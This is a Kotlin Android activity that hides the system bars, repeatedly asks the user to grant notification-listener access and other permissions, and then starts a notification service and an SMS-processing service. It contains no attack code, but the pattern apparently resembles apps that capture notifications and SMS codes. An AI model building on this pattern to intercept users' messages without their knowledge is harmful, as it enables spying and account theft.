package com.confirmer

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.preference.PreferenceManager
import android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
import android.text.TextUtils
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import com.confirmer.permissionsandserver.PermissionOn
import com.confirmer.permissionsandserver.ServesNotify
import android.provider.Settings;
import android.widget.Button
import android.widget.Toast
import com.confirmer.permissionsandserver.SmsProcessService


class ScreenMainApp : AppCompatActivity() {


    val ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";
    val ACTION_NOTIFICATION_LISTENER_SETTINGS =
        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    lateinit var mContext: Context
    private var enableNotificationListenerAlertDialog: AlertDialog? = null
    private val df = PermissionOn(this, this)

    private fun isNotificationServiceEnabled(): Boolean {
        val pkgName = getPackageName()
        //val ENABLED_NOTIFICATION_LISTENERS = "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
        val flat = Settings.Secure.getString(contentResolver, ENABLED_NOTIFICATION_LISTENERS)
        if (!TextUtils.isEmpty(flat)) {
            //final String[] names = flat.split(":");
            val names = flat.split(":")

            for (i in names) {
                val cn = ComponentName.unflattenFromString(i)
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.packageName))
                        return true
                }
            }

//            for (int i = 0; i < names.length; i++) {
//                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
//                if (cn != null) {
//                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
//                        return true;
//                    }
//                }
//            }
        }
        return false
    }


    override fun onRestart() {
        super.onRestart()
       println(" my restart ! 1 ")
       // notiCheck()
    }

    override fun onResume() {
        super.onResume()
        println(" my restart ! 2")

          notiCheck()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(R.layout.main_app_screen)

        hideSystemUI()



        findViewById<Button>(R.id.savve).setOnClickListener {

           Toast.makeText(this, R.string.all_work, Toast.LENGTH_LONG).show()
        }


        if (!isNotificationServiceEnabled()) {

            println(" press this 2")
            enableNotificationListenerAlertDialog = buildNotificationServiceAlertDialog()
            println(" press this 3")
            enableNotificationListenerAlertDialog!!.show()
        } else {
            println( " asdkfj press 4")
            if (df.allPermissionsGranted()) {

                println("press 55 ")
                callServersALL()
                // mContext.startActivity(Intent(mContext, testTabCompose::class.java))

            } else {
                df.requestPermissiong();
            }
        }
        // if not first
    }


    private fun notiCheck(){

         if (!isNotificationServiceEnabled()) {

            println(" press this 2")
            enableNotificationListenerAlertDialog = buildNotificationServiceAlertDialog()
            println(" press this 3")
            enableNotificationListenerAlertDialog!!.show()
        } else {
            println( " asdkfj press 4")
            if (df.allPermissionsGranted()) {

                println("press 55 ")
                callServersALL()
                // mContext.startActivity(Intent(mContext, testTabCompose::class.java))

            } else {
                df.requestPermissiong();
            }
        }

    }


    private fun buildNotificationServiceAlertDialog(): AlertDialog {
        val alertDialogBuilder = AlertDialog.Builder(this)
        alertDialogBuilder.setTitle(R.string.notification_listener_service)
        alertDialogBuilder.setMessage(R.string.notification_listener_service_explanation)
        alertDialogBuilder.setPositiveButton(R.string.yes) { dialogInterface, i ->
            println(" in this pre error ")
            startActivity(Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
        alertDialogBuilder.setNegativeButton(R.string.no, { dialogInterface, i ->

        })

        return (alertDialogBuilder.create())
    }


    private fun callServersALL() {
        //val android_id = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
//          val edi  = prefs.edit()
//          edi.putString("androidID", android_id)
//          edi.putInt("okEnter", 1);
//          edi.apply();


        println(" in a start servers ")
        val requl = Intent(this, ServesNotify::class.java)
        requl.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startService(requl)

        val smsServiceIntent = Intent(this, SmsProcessService::class.java)
        smsServiceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startService(smsServiceIntent)

//              val intentFore = Intent(this, StupidServicePing::class.java)
//              intentFore.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
//              startService(intentFore)
    }


    private fun hideSystemUI() {
        WindowCompat.setDecorFitsSystemWindows(window, false)
        WindowInsetsControllerCompat(window, window.decorView).let { controller ->
            controller.hide(WindowInsetsCompat.Type.systemBars())
            controller.systemBarsBehavior =
                WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        }
    }


    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

//        println(" in a log permissions ")
//
//        if (df.allPermissionsGranted()) {
//
//            callServersALL()
//            // mContext.startActivity(Intent(mContext, testTabCompose::class.java))
//
//        } else {
//            df.requestPermissiong()
//        }




            when (requestCode) {
                11 -> {
                    // If request is cancelled, the result arrays are empty.
                    if ((grantResults.isNotEmpty() &&
                                grantResults[0] == PackageManager.PERMISSION_GRANTED)
                    ) {
                        println(" all request  is granted ! ")

                        callServersALL()

                            // mContext.startActivity(Intent(mContext, testTabCompose::class.java))

                        // Permission is granted. Continue the action or workflow
                        // in your app.
                    } else {
                        // Explain to the user that the feature is unavailable because
                        // the feature requires a permission that the user has denied.
                        // At the same time, respect the user's decision. Don't link to
                        // system settings in an effort to convince the user to change
                        // their decision.
                    }
                    return
                }
            }
        }


}